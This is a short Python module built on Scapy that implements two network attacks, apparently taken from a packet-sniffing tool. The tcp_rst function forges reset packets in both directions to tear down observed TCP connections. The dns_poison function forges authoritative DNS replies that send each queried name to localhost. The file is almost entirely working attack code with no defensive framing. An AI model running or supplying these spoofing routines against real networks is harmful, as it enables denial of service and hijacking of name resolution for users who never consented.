from scapy.layers import inet, inet6, dns
from scapy.packet import Packet
from scapy.sendrecv import send


def tcp_rst(p: Packet):
    """
    TCP RST attack
    :param p: packet for generate attack exploit
    """
    if not p.haslayer(inet.TCP) or not p[inet.TCP].flags.A:
        return

    seq = p[inet.TCP].seq
    ack = p[inet.TCP].ack
    sport = p[inet.TCP].sport
    dport = p[inet.TCP].dport
    if p.haslayer(inet.IP):
        src = p[inet.IP].src
        dst = p[inet.IP].dst
        exp1 = inet.IP(src=src, dst=dst) / inet.TCP(sport=sport, dport=dport, seq=seq, window=0, flags=4)
        exp2 = inet.IP(src=dst, dst=src) / inet.TCP(sport=dport, dport=sport, seq=ack, window=0, flags=4)
    else:
        src = p[inet6.IPv6].src
        dst = p[inet6.IPv6].dst
        exp1 = inet6.IPv6(src=src, dst=dst) / inet.TCP(sport=sport, dport=dport, seq=seq, window=0, flags=4)
        exp2 = inet6.IPv6(src=dst, dst=src) / inet.TCP(sport=dport, dport=sport, seq=ack, window=0, flags=4)

    send(exp1, verbose=False)
    send(exp2, verbose=False)


def dns_poison(p: Packet):
    """
    DNS poisoning (spoofing) attack
    Not working in most of the time due to our delay
    :param p: packet for generate attack exploit
    """
    if not p.haslayer(dns.DNS) or p.haslayer(dns.DNSRR) or not p.haslayer(inet.UDP):
        return

    if p.haslayer(inet.IP):
        exp = inet.IP(dst=p[inet.IP].src, src=p[inet.IP].dst) / \
              inet.UDP(dport=p[inet.UDP].sport, sport=p[inet.UDP].dport) / \
              dns.DNS(id=p[dns.DNS].id, qd=p[dns.DNS].qd, aa=1, qr=1,
                      an=dns.DNSRR(rrname=p[dns.DNS].qd.qname, ttl=10, rdata='127.0.0.1'))
    else:
        exp = inet6.IPv6(dst=p[inet6.IPv6].src, src=p[inet6.IPv6].dst) / \
              inet.UDP(dport=p[inet.UDP].sport, sport=p[inet.UDP].dport) / \
              dns.DNS(id=p[dns.DNS].id, qd=p[dns.DNS].qd, aa=1, qr=1,
                      an=dns.DNSRR(rrname=p[dns.DNS].qd.qname, ttl=10, type=28, rdata='::1'))

    send(exp, verbose=False)
